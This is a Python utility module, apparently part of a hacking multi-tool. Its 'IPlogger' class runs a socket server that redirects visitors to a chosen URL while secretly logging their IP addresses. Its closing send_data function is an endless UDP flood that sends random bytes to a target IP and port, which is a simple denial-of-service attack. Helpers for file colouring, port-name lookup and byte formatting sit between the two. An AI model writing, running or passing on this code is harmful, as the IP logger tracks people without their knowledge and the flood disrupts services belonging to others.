import socket
import threading
import pycli
import os
from datetime import datetime
import random 

class IPlogger(threading.Thread):
    def __init__(self, url: str, port: int, host: str) -> None:
        threading.Thread.__init__(self)
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind(("", port))
        self.url = url
        self.port = port
        self.host = host

    def run(self) -> None:
        print(f"{pycli.colored("00FF00", "[Online]")} http://{self.host}:{self.port}/")
        while True:
            self.socket.listen(10)
            client, (ip, port) = self.socket.accept()
            threading.Thread(target=self.redirection, args=[client, ip]).start()

    def redirection(self, client: socket.socket, ip: str) -> None:
        data = client.recv(4096)
        client.send(f"HTTP/1.1 302 Found\r\nLocation: {self.url}\r\n\r\n".encode())
        client.close()
        self.write_logs(ip)

    def write_logs(self, ip: str) -> None:
        if not os.path.exists("output"):
            os.mkdir("output")
        if not os.path.exists(os.path.join("output","iplogger")):
            os.mkdir(os.path.join("output","iplogger"))
        with open(os.path.join("output","iplogger", f"{self.url}.log"), "a", encoding="UTF-8") as file:
            file.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {ip}")

def bytes_convert(size: int) -> str:
    units = ["b", "Kb", "Mb", "Gb", "Tb"]
    index = 0
    while size >= 1024 and index < len(units) - 1:
        size /= 1024
        index += 1
    return f"{round(size)} {units[index]}"

def color_file(file: str) -> str:
    color = None
    if os.path.isdir(file):
            color = "0c7fe4"
    else:
        ext = os.path.splitext(file)[1].lower()
        if ext in [".exe", ".msi", ".cmd", ".bat", ".com", ".vbs", ".ps1", ".scr", ".sh", ".bin", ".run", ".app"]:
            color = "FF0000"
        elif ext in [".jpg", ".gif", ".png", ".tiff", ".jpeg", ".svg", ".bmp", ".tif", ".heif", ".heic", ".webp", ".ai", ".pdf", ".psd", ".xcf", ".ico", ".raw", "psd"]:
            color = "FF00FF"
        elif ext in [".tar", ".zip", ".deb", ".rpm", ".iso", ".rar", ".7z", ".cab", ".tar.gz", "tgz", ".tar.bz2", ".gz", ".bz2", ".xz", ".iso", ".dmg", ".z", ".arj", ".lzma"]:
            color = "FFFF00"
        elif ext in [".mp3", ".ogg", ".wav", ".flac", ".aac", ".ogg", ".wma", ".m4a", ".aiff", ".opus", ".alac", ".arm"]:
            color = "0cFF0c"
        elif ext in [".mp4", ".avi", ".mkv", ".mov", ".wmw", ".flv", ".webm", "3gp", ".m4v", ".mpg", ".mpeg", ".vob", ".ogv", ".mts", ".m2ts", ".ts"]:
            color = "ff8b00"

    return color

def port_used(port: int) -> str:
    port_services = {
        21: 'FTP',
        22: 'SSH',
        23: 'Telnet',
        25: 'SMTP',
        53: 'DNS',
        80: 'HTTP',
        110: 'POP3',
        143: 'IMAP',
        443: 'HTTPS',
        554: 'RTSP',
        3306: 'MySQL',
        3389: 'Remote Desktop',
        8080: 'HTTP Proxy',
        25565: 'Minecraft Server'
    }
    if port not in port_services:
        return ""
    else:
        return port_services[port]
    
def send_data(ip: str, port: int, size: int) -> None:
    target = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    target.connect((ip, port))
    while True:
        target.send(random._urandom(size))
        print(f"{pycli.colored('[', 'FF0000')}{pycli.colored(f'{ip}:{port}', "FFFA00")}{pycli.colored(']', "FF0000")} Send {size} Bytes")